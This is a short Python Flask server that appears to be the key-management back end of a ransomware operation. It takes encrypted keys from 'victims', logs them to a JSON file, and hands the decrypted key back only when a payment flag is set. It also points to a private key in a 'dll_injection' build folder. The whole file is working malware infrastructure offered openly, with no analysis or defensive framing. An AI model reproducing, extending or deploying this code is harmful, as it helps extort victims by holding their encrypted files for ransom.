# install flask pip install flask before running the server

from flask import Flask, request, jsonify, Response
import json
import base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend

app = Flask(__name__)

@app.route('/api/keys', methods=['POST'])
def receive_victim_key():
    data = request.json
    victim_id = data.get('victim_id', 'UNKNOWN')
    encrypted_key = data.get('encrypted_key', 'NONE')

    # load existing victims from file
    try:
        with open('victims_keys.json', 'r') as f:
            victims = json.load(f)
    except:
        victims = {}

    # add new victim with paid = True for testing
    victims[victim_id] = {
        'encrypted_key': encrypted_key,
        'paid': True
    }

    # save to file
    with open('victims_keys.json', 'w') as f:
        json.dump(victims, f)
    
    # print to console
    print(f"Victim ID: {data.get('victim_id', 'UNKNOWN')}")
    print(f"Encrypted Key (first 50 chars): {data.get('encrypted_key', 'NONE')[:50]}...")
    print(f"JSON payload: {json.dumps(data)}\n")
    
    print("Got a key from victim:", data['victim_id'])
    
    return jsonify({"status": "success"}), 200

#endpoint for sending key
@app.route('/api/key/<victim_id>', methods=['GET'])
def send_key(victim_id):
    try:
        with open('victims_keys.json', 'r') as f:
            victims = json.load(f)
    except:
        return jsonify({"status": "error", "message": "No victims file found"}), 404
    
    if victim_id not in victims:
        return jsonify({"status": "error", "message": "Victim ID not found"}), 404
    
    #check if paid
    paid = victims[victim_id].get('paid', False)
    if not paid:
        return jsonify({"status": "error", "message": "Payment not received"}), 403
    
    # get encrypted key
    encrypted_key = victims[victim_id].get('encrypted_key', 'NONE')
    
    # decode base64
    encrypted_key_bytes = base64.b64decode(encrypted_key)

    # load private key
    with open('dll_injection/build/private_key.pem', 'rb') as f:
        private_key_data = f.read()
    
    private_key = serialization.load_pem_private_key(
        private_key_data,
        password=None,
        backend=default_backend()
    )
    
    # decrypt the key
    decrypted_key = private_key.decrypt(
        encrypted_key_bytes,
        padding.PKCS1v15()
    )
    
    # send decrypted key
    return Response(decrypted_key, content_type='application/octet-stream')
    
# test endpoint
@app.route('/test', methods=['GET'])
def test():
    return jsonify({
        "status": "OK",
        "message": "server working"
    }), 200

if __name__ == '__main__':
    print("Server is running on port 8000")
    app.run(host='0.0.0.0', port=8000)

